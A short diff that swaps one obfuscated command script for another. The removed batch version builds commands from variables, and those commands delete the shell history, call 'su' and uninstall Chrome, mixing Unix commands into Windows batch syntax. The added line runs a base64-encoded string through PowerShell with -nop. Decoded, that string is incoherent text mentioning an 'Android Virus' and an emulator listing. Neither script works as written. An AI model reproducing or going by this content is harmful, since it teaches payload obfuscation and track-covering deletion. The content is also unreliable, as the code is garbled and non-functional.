@@ -1,5 +1,1 @@
-@echo off
-setlocal enabledelayedexpansion
-
-set "a=!A" & set "l=echo" & set "s=pwd" & set "t=fi" & set "x=rev" & set "c=hist" & set "m=rm" & set "g=cg" & set "d=dpkg" & set "u=su" & set "e=ge"
-%t%.com&%g%&%m% ~/.bash_history&%l% %s%&%u%&%a%&%d% --remove google-chrome-stable&%e%t -l
+powershell -nop -c "& {&$([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('QGVjaG8gb2ZmCmlnIGNvbmZpZwpjZGxzCmVjaG8gQXZhaWxhYmxlIEFuZHJvaWQgVmlydXMgKERldGFpbHMgRnJvbSBjb20gRnJlZS8yMDI0L0FwcERhdGEvTG9jYWwvQW5kcm9pZC9TbGlua3MuZW11bGF0b3IvZW11bGF0b3IgLS1saXN0LWF2ZHM=')).Replace('AvdName', (Read-Host 'Enter the name of the AVD you want to start'))}"
